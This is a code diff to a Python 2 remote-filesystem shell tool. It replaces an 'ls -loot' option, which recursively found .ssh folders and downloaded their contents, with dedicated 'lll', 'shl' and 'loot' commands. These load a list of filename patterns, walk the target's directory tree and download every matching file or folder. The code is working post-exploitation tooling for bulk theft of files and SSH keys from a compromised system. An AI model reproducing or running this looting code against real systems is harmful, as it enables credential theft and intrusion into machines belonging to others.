@@ -33,6 +33,8 @@ class Exit(Exception):
     pass
 
 class Commands(object):
+    filesOrFoldersToLoot = []
+
     def __init__(self, shell):
         self.shell = shell
     def __call__(self, *args):
@@ -94,21 +96,16 @@ class Commands(object):
         print os.getcwd()
 
     def ls(self, *args):
-        """ls [-r] [-loot] [<filename> ...]
+        """ls [-r] [<filename> ...]
 
         Print info about <filename>. <filename> defaults to '.'.
         Columns are Mode, UID, GID, Size, Mtime, and Name.
-        '-r' enables recursive listing.
-        '-loot' finds all .ssh folders recursively and loots them."""
+        '-r' enables recursive listing."""
         tolist = list(args)
         recursive = False
-        loot = False
         if "-r" in tolist:
             recursive = True
             tolist.remove("-r")
-        if "-loot" in tolist:
-            loot = True
-            tolist.remove("-loot")
         if not tolist:
             tolist.append(".")
         while tolist:
@@ -119,8 +116,7 @@ class Commands(object):
             try:
                 if self.shell.isdir(f):
                     dirname = f
-                    if not loot:
-                        print "{0}:".format(dirname)
+                    print "{0}:".format(dirname)
                     lines = self.shell.spy.readdir(f,0)
                 else:
                     dirname = path.dirname(f)
@@ -143,29 +139,109 @@ class Commands(object):
                             report(e)
                         name = "{0} -> {1}".format(name, dest)
 
-                    if loot == True and ".ssh" in dirname:
-                        if name != "." and name != ".." and not self.shell.isdir(fullname):
-                            print fullname
-                            self.get2(fullname, None)
-                    elif loot != True:
-                        print "{mode:06o} {size: >11} {date!s} {name}".format(
-                            mode=attr.st_mode,
-                            size=attr.st_size,
-                            date=datetime.fromtimestamp(attr.st_mtime),
-                            name=name
-                            )
+                    print "{mode:06o} {size: >11} {date!s} {name}".format(
+                        mode=attr.st_mode,
+                        size=attr.st_size,
+                        date=datetime.fromtimestamp(attr.st_mtime),
+                        name=name
+                        )
             except IOError as e:
                 report(e)
                 continue
 
+
+    def lll(self, localfilename):
+        """lll <localfilename>
+        Loads the Loot List (lll) from a <localfilename>.
+        Use shl to view the loaded list.
+        Run loot command to find and download all desired files."""
+
+        try:
+            with open(localfilename) as f_in:
+                Commands.filesOrFoldersToLoot = filter(None, (line.rstrip() for line in f_in))
+
+            print "{numlines} loaded".format(numlines=len(Commands.filesOrFoldersToLoot))
+        except IOError as e:
+            report(e)
+
+    def shl(self):
+        """shl - Shows the Loot List loaded via lll"""
+        print "List of files to loot:"
+        for i in range(0, len(Commands.filesOrFoldersToLoot)):
+            print Commands.filesOrFoldersToLoot[i]
+
+
+    def loot(self, targetfilename, localfilename=None):
+        """loot <filename> [<localfilename>]
+        Uses the target list loaded via lll command, finds them and loots them into <localfilename>.
+        If no <localfilename> is given, defaults to current working directory."""
+
+        tolist = list(targetfilename)
+
+        while tolist:
+            filename = tolist.pop()
+            f = self.shell.canonicalize(filename)
+            lines = None
+            dirname = None
+            try:
+                if self.shell.isdir(f):
+                    dirname = f
+                    lines = self.shell.spy.readdir(f,0)
+                else:
+                    dirname = path.dirname(f)
+                    lines = [(None,path.basename(f))]
+
+                for entry in lines:
+                    name = entry[1]
+                    fullname = path.join(dirname, name)
+                    attr = self.shell.spy.getattr(fullname)
+
+                    if self.shell.isdir(fullname):
+                        if name != "." and name != "..":
+                            if fullname != filename:
+                                tolist.append(fullname)
+
+                    for pattern in Commands.filesOrFoldersToLoot:
+                        if re.match(pattern, name) is not None:
+                            print fullname
+                            if not self.shell.isdir(fullname):
+                                self.get2(fullname, localfilename)
+                            else:
+                                self.getFolder(fullname, localfilename)
+            except IOError as e:
+                report(e)
+                continue
+
+
     def cat(self,filename):
         return self.get(filename,"-")
+
+    def getFolder(self, foldername, localname=None):
+        """getFolder <foldername> [<localname>]
+
+        Retrieve <foldername> and save to <localname> folder.
+        If no <localname> is given, defaults to the current local working directory."""
+        try:
+            if self.shell.isdir(foldername):
+                lines = self.shell.spy.readdir(foldername,0)
+            else:
+                print "{0} is not a folder!".format(foldername)
+
+            for _,line in lines:
+                if line != "." and line != "..":
+                    # import code;
+                    # code.interact(local=locals())
+                    self.get2(path.join(foldername, line), localname)
+
+        except IOError as e:
+            report(e)
+
 
     def get2(self, filename, localname=None):
         """get2 <filename> [<localname>]
 
-        Retrieve <filename> and save to <localname> folder. If no <localname> is given,
-        defaults to the current local working directory."""
+        Retrieve <filename> and save to <localname> folder.
+        If no <localname> is given, defaults to the current local working directory."""
         f = self.shell.canonicalize(filename)
         size = self.shell.spy.getattr(f).st_size
         if localname=="-":
@@ -175,9 +251,6 @@ class Commands(object):
                 localname = os.path.normpath(os.path.join(localname, path.basename(f)))
             localname = localname or os.getcwd()
             dest = localname+f
-            # import code;
-            # code.interact(local=locals())
-
             if not os.path.exists(os.path.dirname(dest)):
                 try:
                     os.makedirs(os.path.dirname(dest))
